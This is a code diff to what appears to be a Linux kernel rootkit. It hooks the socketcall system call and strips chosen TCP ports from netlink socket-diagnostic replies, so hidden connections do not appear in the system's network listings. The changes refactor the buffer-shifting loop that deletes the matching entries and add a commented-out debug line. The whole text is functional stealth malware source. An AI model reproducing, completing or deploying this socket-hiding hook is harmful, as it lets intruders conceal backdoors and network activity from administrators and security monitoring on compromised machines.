@@ -136,6 +136,7 @@ static int checkport(struct nlmsghdr *nlh){
     struct list_head* cur;
     list_for_each(cur, &sockets_to_hide){
         socket = list_entry(cur, struct l_socket_to_hide, list);
+        //printk(KERN_ALERT "Checking %d against %d\n", lport, socket->port);
         if (lport == socket->port && socket->prot == OUR_PROT_TCP){
             return 1;
         } 
@@ -150,10 +151,10 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
     struct nlmsghdr* h;
     __kernel_size_t numblocks;
     struct inet_diag_msg *r;
-    char* previous;
     char* currhdr;
     int i;
     int found=0;
+    int offset;
     // here the actual work for the recvmsg system call
     if(call == SYS_RECVMSG){
         // retrieve data structures
@@ -166,8 +167,7 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
         // status holds the bytes remaining
         status = retval;
         // now, we remove the sockets to be hidden from the result...
-        found = 0;
-        previous = NLMSG_DATA(h);
+        found = 1;
         while (NLMSG_OK(h, status)) {
             if (found == 0){
                 h = NLMSG_NEXT(h, status);
@@ -175,11 +175,12 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
             currhdr = (char*)h;
             if (checkport(h)){
                 found = 1;
+                offset = NLMSG_ALIGN((h)->nlmsg_len);
                 for (i=0; i<status; ++i){
                     // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
-                    currhdr[i] = currhdr[i + NLMSG_ALIGN((h)->nlmsg_len)];
+                    currhdr[i] = currhdr[i + offset];
                 }
-                retval = retval - NLMSG_ALIGN((h)->nlmsg_len);
+                retval = retval - offset;
             }
             else {
                 found = 0;
